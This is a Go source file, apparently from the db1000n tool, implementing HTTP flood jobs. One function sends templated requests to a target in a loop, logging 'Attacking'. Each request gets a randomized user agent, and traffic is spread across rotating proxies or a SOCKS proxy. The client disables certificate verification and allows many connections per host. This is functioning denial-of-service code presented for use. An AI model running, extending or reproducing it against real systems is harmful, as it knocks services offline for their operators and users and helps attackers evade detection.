package jobs

import (
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net"
	"strings"
	"text/template"
	"time"

	"github.com/corpix/uarand"
	"github.com/google/uuid"
	"github.com/valyala/fasthttp"
	"github.com/valyala/fasthttp/fasthttpproxy"

	"github.com/Arriven/db1000n/src/metrics"
	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/templates"
)

type httpJobConfig struct {
	BasicJobConfig

	Path    string
	Method  string
	Body    string
	Headers map[string]string
	Cookies map[string]string
	Client  map[string]interface{} // See HTTPClientConfig
}

func singleRequestJob(ctx context.Context, globalConfig GlobalConfig, args Args, debug bool) (data interface{}, err error) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()
	defer utils.PanicHandler()

	var jobConfig httpJobConfig
	if err := utils.Decode(args, &jobConfig); err != nil {
		log.Printf("Error parsing job config: %v", err)
		return nil, err
	}
	client := newFastHTTPClient(jobConfig.Client, globalConfig, debug)

	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseResponse(resp)
	method, path, body := templates.ParseAndExecute(jobConfig.Method, ctx), templates.ParseAndExecute(jobConfig.Path, ctx), templates.ParseAndExecute(jobConfig.Body, ctx)

	log.Printf("Sent single http request to %v", path)

	req.SetRequestURI(path)
	req.Header.SetMethod(method)
	req.SetBodyString(body)
	dataSize := len(method) + len(path) + len(body) // Rough uploaded data size for reporting
	// Add random user agent and configured headers
	req.Header.Set("user-agent", uarand.GetRandom())
	for key, value := range jobConfig.Headers {
		key, value = templates.ParseAndExecute(key, ctx), templates.ParseAndExecute(value, ctx)
		req.Header.Set(key, value)
		dataSize += len(key) + len(value)
	}
	for key, value := range jobConfig.Cookies {
		key, value = templates.ParseAndExecute(key, ctx), templates.ParseAndExecute(value, ctx)
		req.Header.SetCookie(key, value)
		dataSize += len(key) + len(value)
	}

	metrics.Default.Write(metrics.Traffic, uuid.New().String(), dataSize)
	err = sendFastHTTPRequest(client, req, resp, debug)
	if err == nil {
		metrics.Default.Write(metrics.ProcessedTraffic, uuid.New().String(), dataSize)
	}
	headers := make(map[string]interface{})
	resp.Header.VisitAll(func(key []byte, value []byte) {
		headers[string(key)] = string(value)
	})
	cookies := make(map[string]interface{})
	resp.Header.VisitAllCookie(func(key []byte, value []byte) {
		c := fasthttp.AcquireCookie()
		defer fasthttp.ReleaseCookie(c)

		c.ParseBytes(value)

		if expire := c.Expire(); expire != fasthttp.CookieExpireUnlimited && expire.Before(time.Now()) {
			if debug {
				log.Println("cookie from request expired:", string(key))
			}
		} else {
			cookies[string(key)] = string(c.Value())
		}
	})
	response := make(map[string]interface{})
	response["body"] = string(resp.Body())
	response["status_code"] = resp.StatusCode()
	response["headers"] = headers
	response["cookies"] = cookies
	result := make(map[string]interface{})
	result["response"] = response
	result["error"] = err
	return result, nil
}

func fastHTTPJob(ctx context.Context, globalConfig GlobalConfig, args Args, debug bool) (data interface{}, err error) {
	ctx, cancel := context.WithCancel(ctx)
	defer cancel()
	defer utils.PanicHandler()

	var jobConfig httpJobConfig
	if err := utils.Decode(args, &jobConfig); err != nil {
		log.Printf("Error parsing job config: %v", err)
		return nil, err
	}

	client := newFastHTTPClient(jobConfig.Client, globalConfig, debug)

	methodTpl, pathTpl, bodyTpl, headerTpls, cookieTpls, err := parseHTTPRequestTemplates(
		jobConfig.Method, jobConfig.Path, jobConfig.Body, jobConfig.Headers, jobConfig.Cookies)
	if err != nil {
		return nil, err
	}

	trafficMonitor := metrics.Default.NewWriter(metrics.Traffic, uuid.New().String())
	go trafficMonitor.Update(ctx, time.Second)
	processedTrafficMonitor := metrics.Default.NewWriter(metrics.ProcessedTraffic, uuid.NewString())
	go processedTrafficMonitor.Update(ctx, time.Second)

	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	log.Printf("Attacking %v", jobConfig.Path)

	for jobConfig.Next(ctx) {
		method, path, body := templates.Execute(methodTpl, ctx), templates.Execute(pathTpl, ctx), templates.Execute(bodyTpl, ctx)
		dataSize := len(method) + len(path) + len(body) // Rough uploaded data size for reporting

		req.SetRequestURI(path)
		req.Header.SetMethod(method)
		req.SetBodyString(body)
		// Add random user agent and configured headers
		req.Header.Set("user-agent", uarand.GetRandom())
		for keyTpl, valueTpl := range headerTpls {
			key, value := templates.Execute(keyTpl, ctx), templates.Execute(valueTpl, ctx)
			req.Header.Set(key, value)
			dataSize += len(key) + len(value)
		}
		for keyTpl, valueTpl := range cookieTpls {
			key, value := templates.Execute(keyTpl, ctx), templates.Execute(valueTpl, ctx)
			req.Header.SetCookie(key, value)
			dataSize += len(key) + len(value)
		}

		trafficMonitor.Add(dataSize)
		if err := sendFastHTTPRequest(client, req, nil, debug); err != nil {
			if debug {
				log.Printf("Error sending request %v: %v", req, err)
			}
		} else {
			processedTrafficMonitor.Add(dataSize)
		}
	}

	return nil, nil
}

func newFastHTTPClient(clientCfg map[string]interface{}, globalConfig GlobalConfig, debug bool) (client *fasthttp.Client) {
	var clientConfig struct {
		TLSClientConfig *tls.Config    `mapstructure:"tls_config,omitempty"`
		Timeout         *time.Duration `mapstructure:"timeout"`
		ReadTimeout     *time.Duration `mapstructure:"read_timeout"`
		WriteTimeout    *time.Duration `mapstructure:"write_timeout"`
		IdleTimeout     *time.Duration `mapstructure:"idle_timeout"`
		MaxIdleConns    *int           `mapstructure:"max_idle_connections"`
		ProxyURLs       string         `mapstructure:"proxy_urls"`
	}

	if err := utils.Decode(clientCfg, &clientConfig); err != nil && debug {
		log.Printf("Failed to parse job client, ignoring: %v", err)
	}

	timeout := 90 * time.Second
	if clientConfig.Timeout != nil {
		timeout = *clientConfig.Timeout
	}

	readTimeout := timeout
	if clientConfig.ReadTimeout != nil {
		readTimeout = *clientConfig.ReadTimeout
	}

	writeTimeout := timeout
	if clientConfig.WriteTimeout != nil {
		writeTimeout = *clientConfig.WriteTimeout
	}

	idleTimeout := timeout
	if clientConfig.IdleTimeout != nil {
		idleTimeout = *clientConfig.IdleTimeout
	}

	maxIdleConns := 1000
	if clientConfig.MaxIdleConns != nil {
		maxIdleConns = *clientConfig.MaxIdleConns
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}
	if clientConfig.TLSClientConfig != nil {
		tlsConfig = clientConfig.TLSClientConfig
	}

	proxy := func() string { return "" }
	proxylist := templates.ParseAndExecute(clientConfig.ProxyURLs, nil)
	if proxylist != "" {
		if debug {
			log.Printf("List of proxies: %s", proxylist)
		}

		var proxyURLs = strings.Split(proxylist, ",")

		if debug {
			log.Printf("proxyURLs: %v", proxyURLs)
		}

		// Return random proxy from the list
		proxy = func() string {
			if len(proxyURLs) == 0 {
				return ""
			}

			return proxyURLs[rand.Intn(len(proxyURLs))]
		}
	}

	defaultProxy := fasthttpproxy.FasthttpProxyHTTPDialerTimeout(timeout)
	if globalConfig.ProxyURL != "" {
		defaultProxy = fasthttpproxy.FasthttpSocksDialer(globalConfig.ProxyURL)
	}

	return &fasthttp.Client{
		ReadTimeout:                   readTimeout,
		WriteTimeout:                  writeTimeout,
		MaxConnDuration:               timeout,
		MaxIdleConnDuration:           idleTimeout,
		MaxConnsPerHost:               maxIdleConns,
		NoDefaultUserAgentHeader:      true, // Don't send: User-Agent: fasthttp
		DisableHeaderNamesNormalizing: true, // If you set the case on your headers correctly you can enable this
		DisablePathNormalizing:        true,
		TLSConfig:                     tlsConfig,
		// increase DNS cache time to an hour instead of default minute
		Dial: fastHTTPProxyDial(proxy, timeout, defaultProxy),
	}
}

func fastHTTPProxyDial(proxyFunc func() string, timeout time.Duration, backup fasthttp.DialFunc) fasthttp.DialFunc {
	return func(addr string) (net.Conn, error) {
		proxy := proxyFunc()
		if proxy == "" {
			return backup(addr)
		}
		return fasthttpproxy.FasthttpHTTPDialerTimeout(proxy, timeout)(addr)
	}
}

func sendFastHTTPRequest(client *fasthttp.Client, req *fasthttp.Request, resp *fasthttp.Response, debug bool) error {
	if debug {
		log.Printf("%s %s started at %d", string(req.Header.Method()), string(req.RequestURI()), time.Now().Unix())
	}

	if err := client.Do(req, resp); err != nil {
		metrics.IncHTTP(string(req.Host()), string(req.Header.Method()), metrics.StatusFail)

		return err
	}

	metrics.IncHTTP(string(req.Host()), string(req.Header.Method()), metrics.StatusSuccess)

	return nil
}

func parseHTTPRequestTemplates(method, path, body string, headers map[string]string, cookies map[string]string) (
	methodTpl, pathTpl, bodyTpl *template.Template, headerTpls, cookieTpls map[*template.Template]*template.Template, err error) {
	if methodTpl, err = templates.Parse(method); err != nil {
		return nil, nil, nil, nil, nil, fmt.Errorf("error parsing method template: %v", err)
	}

	if pathTpl, err = templates.Parse(path); err != nil {
		return nil, nil, nil, nil, nil, fmt.Errorf("error parsing path template: %v", err)
	}

	if bodyTpl, err = templates.Parse(body); err != nil {
		return nil, nil, nil, nil, nil, fmt.Errorf("error parsing body template: %v", err)
	}

	headerTpls = make(map[*template.Template]*template.Template, len(headers))
	for key, value := range headers {
		keyTpl, err := templates.Parse(key)
		if err != nil {
			return nil, nil, nil, nil, nil, fmt.Errorf("error parsing header key template %q: %v", key, err)
		}

		valueTpl, err := templates.Parse(value)
		if err != nil {
			return nil, nil, nil, nil, nil, fmt.Errorf("error parsing header value template %q: %v", value, err)
		}

		headerTpls[keyTpl] = valueTpl
	}

	cookieTpls = make(map[*template.Template]*template.Template, len(headers))
	for key, value := range cookies {
		keyTpl, err := templates.Parse(key)
		if err != nil {
			return nil, nil, nil, nil, nil, fmt.Errorf("error parsing header key template %q: %v", key, err)
		}

		valueTpl, err := templates.Parse(value)
		if err != nil {
			return nil, nil, nil, nil, nil, fmt.Errorf("error parsing header value template %q: %v", value, err)
		}

		cookieTpls[keyTpl] = valueTpl
	}

	return methodTpl, pathTpl, bodyTpl, headerTpls, cookieTpls, nil
}
